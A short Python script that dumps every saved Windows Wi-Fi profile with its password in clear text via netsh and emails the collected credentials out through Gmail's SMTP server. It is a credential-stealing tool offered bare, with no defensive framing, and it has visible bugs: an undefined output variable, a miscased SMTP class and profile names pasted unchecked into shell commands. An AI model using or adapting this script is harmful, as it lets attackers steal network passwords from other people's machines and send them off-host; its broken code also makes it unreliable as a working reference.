#!/usr/bin/python

import subprocess, smtplib, re

command = "netsh wlan show profile"
networks = subprocess.check_output(command,shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

output=""
for network in network_list:
	command2 = "netsh wlan show profile " + network + " key=clear"
	one_network_result = subprocess.check_output(command2, shell=True)
	final_output += one_network_result

my_email = input("Enter Email: ")
password = input("Enter Password: ")

server = smtplib.smtp("smtp.gmail.com", 587)
server.starttls()
server.login(my_email,password)
server.sendmail(my_email, my_email, final_output)
server.quit()
